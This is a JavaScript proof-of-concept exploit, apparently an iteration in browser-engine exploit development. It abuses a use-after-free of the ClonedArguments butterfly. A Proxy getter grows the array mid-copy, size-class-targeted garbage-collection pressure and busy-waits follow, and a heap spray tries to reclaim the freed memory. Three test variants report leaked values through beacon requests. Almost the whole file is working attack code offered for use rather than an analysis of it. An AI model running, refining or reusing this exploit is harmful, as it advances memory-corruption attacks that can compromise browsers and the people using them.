// p223 — ClonedArguments butterfly UAF: targeted GC reclaim
//
// p222 GC pressure was WRONG SIZE CLASS: used 4-element arrays (~40B butterfly)
// and plain objects. The freed butterfly is 520 bytes → TZone class 544.
// NEED pressure in the 544-byte auxiliary size class specifically.
//
// Also testing whether conservative stack scanning blocks reclaim.
// data pointer on C stack may conservatively root the old butterfly
// during copyToArguments. If so, Test B (post-return spray) may work
// since data is off the stack after copyToArguments returns.
//
// Beacon prefix: V223-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V223-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  // Check if gc() function is available (unlikely in production but worth trying)
  var hasGC = false;
  try {
    if (typeof gc === 'function') {
      hasGC = true;
      BS('HAS-GC-FUNC');
    }
  } catch (e) {}

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  var NARGS = 64;

  // Helper: report hole values from a result array
  function reportHoles(prefix, result, holes) {
    var hits = 0;
    for (var r = 0; r < Math.min(result.length, NARGS); r++) {
      var val = result[r];
      if (typeof val === 'number') {
        var u = val >>> 0;
        if ((u >>> 16) === 0xBEEF) {
          hits++;
          if (hits <= 10) BS(prefix + 'HIT-' + r + '=' + hex(u));
        } else if ((u >>> 16) === 0xCAFE) {
          hits++;
          if (hits <= 10) BS(prefix + 'CAFE-' + r + '=' + hex(u));
        }
      } else if (typeof val === 'object' && val !== null) {
        BS(prefix + 'OBJ-' + r);
      }
    }
    BS(prefix + 'HITS-' + hits);

    for (var h = 0; h < holes.length; h++) {
      var idx = holes[h];
      if (idx < result.length) {
        var v = result[idx];
        var f64 = new Float64Array(1);
        f64[0] = (typeof v === 'number') ? v : 0;
        var u32 = new Uint32Array(f64.buffer);
        BS(prefix + 'H' + idx + '=' + hex(u32[1]) + '_' + hex(u32[0]));
      }
    }
  }

  // ==== TEST A: Same-size-class GC pressure + busy-wait + spray ====
  // FIX: use 64-element arrays for pressure (520B butterfly → 544B class)
  try {
    BS('A-START');
    var aTrap = 0;
    var aSpray = [];

    var aArgs = [];
    for (var a = 0; a < NARGS; a++) aArgs.push(a + 1);
    var args1 = target.apply(null, aArgs);

    delete args1[3];
    delete args1[7];
    delete args1[11];
    delete args1[15];
    delete args1[19];

    var trap1 = {
      get: function(t, prop) {
        aTrap++;
        if (aTrap === 1) {
          BS('A-TRAP-' + prop);

          // Step 1: Grow butterfly → stale pointer
          for (var j = 100; j < 500; j++) args1[j] = 0x41;
          BS('A-GREW');

          // Step 2: GC pressure in the CORRECT size class (544 bytes)
          // Create 20K 64-element arrays → each butterfly = 520B → 544B class
          // This exhausts the 544-byte free list in auxiliary space
          var pressure = [];
          for (var g = 0; g < 20000; g++) {
            var p = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) p[k] = g;
            pressure.push(p);
          }
          BS('A-PRESSURE-' + pressure.length);

          // Step 3: Release pressure (make them eligible for GC)
          pressure.length = 0;
          pressure = null;

          // Step 4: Try explicit gc() if available
          if (hasGC) {
            try { gc(); BS('A-GC-CALLED'); } catch (e) {}
          }

          // Step 5: More allocation pressure to force synchronous GC
          // When auxiliary space runs out, allocateSlow triggers sync collection
          var pressure2 = [];
          for (var g = 0; g < 20000; g++) {
            var p = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) p[k] = g + 20000;
            pressure2.push(p);
          }
          pressure2.length = 0;
          pressure2 = null;
          BS('A-PRESSURE2');

          // Step 6: Busy-wait 150ms for async GC to complete sweep
          var t0 = Date.now();
          while (Date.now() - t0 < 150) { /* spin */ }
          BS('A-WAITED');

          // Step 7: Spray with BEEF pattern in same size class
          for (var s = 0; s < 8000; s++) {
            var a = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) {
              a[k] = 0xBEEF0000 | k;
            }
            aSpray.push(a);
          }
          BS('A-SPRAYED-' + aSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args1, new Proxy({}, trap1));

    var result1;
    try {
      result1 = receiver.apply(null, args1);
    } catch (e) {
      BS('A-ERR-' + e.message.substring(0, 30));
    }

    if (result1) {
      BS('A-LEN-' + result1.length);
      reportHoles('A-', result1, [3, 7, 11, 15, 19]);

      // Also check non-hole positions for spray data
      var changed = 0;
      for (var r = 4; r < Math.min(result1.length, NARGS); r++) {
        if (r === 7 || r === 11 || r === 15 || r === 19) continue;
        var val = result1[r];
        if (typeof val === 'number' && val !== (r + 1)) {
          changed++;
          if (changed <= 5) {
            var f64 = new Float64Array(1);
            f64[0] = val;
            var u32 = new Uint32Array(f64.buffer);
            BS('A-CHG' + r + '=' + hex(u32[1]) + '_' + hex(u32[0]));
          }
        }
      }
      BS('A-CHANGED-' + changed);
    }
  } catch (e) {
    BS('A-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST B: Post-return reclaim ====
  // After copyToArguments returns, data is OFF the stack.
  // Conservative scanning can no longer root the old butterfly.
  // Trigger GC, spray, then do a SECOND UAF pass to read the sprayed data.
  try {
    BS('B-START');

    // Phase 1: First UAF pass — just grow butterfly, no spray
    var bTrap1 = 0;
    var bArgs = [];
    for (var a = 0; a < NARGS; a++) bArgs.push(a + 1);
    var args2 = target.apply(null, bArgs);
    delete args2[3];
    delete args2[7];
    delete args2[11];

    var trap2a = {
      get: function(t, prop) {
        bTrap1++;
        if (bTrap1 === 1) {
          BS('B1-TRAP-' + prop);
          // Just grow — no spray. Old butterfly stays unreclaimable during this pass.
          for (var j = 100; j < 500; j++) args2[j] = 0x41;
          BS('B1-GREW');
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args2, new Proxy({}, trap2a));
    var result2a;
    try {
      result2a = receiver.apply(null, args2);
    } catch (e) {
      BS('B1-ERR-' + e.message.substring(0, 30));
    }

    // Phase 2: Now data is off the stack. Trigger GC to free old butterfly.
    BS('B-PHASE2');

    // GC pressure in 544-byte class
    var bPressure = [];
    for (var g = 0; g < 30000; g++) {
      var p = new Array(NARGS);
      for (var k = 0; k < NARGS; k++) p[k] = g;
      bPressure.push(p);
    }
    bPressure.length = 0;
    bPressure = null;

    if (hasGC) try { gc(); } catch (e) {}

    // Busy-wait for GC
    var t0 = Date.now();
    while (Date.now() - t0 < 200) { /* spin */ }

    // Spray to reclaim the freed old butterfly
    var bSpray = [];
    for (var s = 0; s < 10000; s++) {
      var a = new Array(NARGS);
      for (var k = 0; k < NARGS; k++) {
        a[k] = 0xCAFE0000 | k;
      }
      bSpray.push(a);
    }
    BS('B-SPRAYED-' + bSpray.length);

    // Phase 3: Second UAF pass with a NEW ClonedArguments
    // The new ClonedArguments MIGHT get its butterfly at the same address
    // as the spray data (if the allocator reuses the cell)
    var bTrap2 = 0;
    var bArgs2 = [];
    for (var a = 0; a < NARGS; a++) bArgs2.push(a + 1);
    var args3 = target.apply(null, bArgs2);
    delete args3[3];
    delete args3[7];
    delete args3[11];

    var trap2b = {
      get: function(t, prop) {
        bTrap2++;
        if (bTrap2 === 1) {
          BS('B2-TRAP-' + prop);
          // Grow to invalidate stale pointer
          for (var j = 100; j < 500; j++) args3[j] = 0x41;
          BS('B2-GREW');
          // DON'T spray — the spray data should already be at the old address
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args3, new Proxy({}, trap2b));
    var result2b;
    try {
      result2b = receiver.apply(null, args3);
    } catch (e) {
      BS('B2-ERR-' + e.message.substring(0, 30));
    }

    if (result2b) {
      BS('B2-LEN-' + result2b.length);
      reportHoles('B2-', result2b, [3, 7, 11]);
    }
  } catch (e) {
    BS('B-OUTER-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST C: Massive single-pass with maximum pressure ====
  // 40K pressure arrays + 200ms wait + spray, all in one trap
  try {
    BS('C-START');
    var cTrap = 0;
    var cSpray = [];

    var cArgs = [];
    for (var a = 0; a < NARGS; a++) cArgs.push(a + 1);
    var args4 = target.apply(null, cArgs);
    delete args4[3];
    delete args4[7];

    var trap3 = {
      get: function(t, prop) {
        cTrap++;
        if (cTrap === 1) {
          BS('C-TRAP-' + prop);
          for (var j = 100; j < 500; j++) args4[j] = 0x41;

          // Extreme pressure: 40K arrays of 64 elements
          var cp = [];
          for (var g = 0; g < 40000; g++) {
            var p = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) p[k] = g;
            cp.push(p);
          }
          cp.length = 0;
          cp = null;

          if (hasGC) try { gc(); } catch (e) {}

          // Second wave
          var cp2 = [];
          for (var g = 0; g < 40000; g++) {
            var p = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) p[k] = g;
            cp2.push(p);
          }
          cp2.length = 0;
          cp2 = null;
          BS('C-PRESSURE-80K');

          // Long wait
          var t0 = Date.now();
          while (Date.now() - t0 < 300) {}
          BS('C-WAITED-300MS');

          // Heavy spray
          for (var s = 0; s < 12000; s++) {
            var a = new Array(NARGS);
            for (var k = 0; k < NARGS; k++) a[k] = 0xBEEF0000 | k;
            cSpray.push(a);
          }
          BS('C-SPRAYED-' + cSpray.length);
        }
        return undefined;
      }
    };

    Object.setPrototypeOf(args4, new Proxy({}, trap3));
    var result3;
    try {
      result3 = receiver.apply(null, args4);
    } catch (e) {
      BS('C-ERR-' + e.message.substring(0, 30));
    }

    if (result3) {
      BS('C-LEN-' + result3.length);
      reportHoles('C-', result3, [3, 7]);

      var cChanged = 0;
      for (var r = 4; r < Math.min(result3.length, NARGS); r++) {
        if (r === 7) continue;
        var val = result3[r];
        if (typeof val === 'number' && val !== (r + 1)) {
          cChanged++;
          if (cChanged <= 3) {
            var f64 = new Float64Array(1);
            f64[0] = val;
            var u32 = new Uint32Array(f64.buffer);
            BS('C-CHG' + r + '=' + hex(u32[1]) + '_' + hex(u32[0]));
          }
        }
      }
      BS('C-CHANGED-' + cChanged);
    }
  } catch (e) {
    BS('C-OUTER-ERR-' + e.message.substring(0, 40));
  }

  BS('DONE');
})();
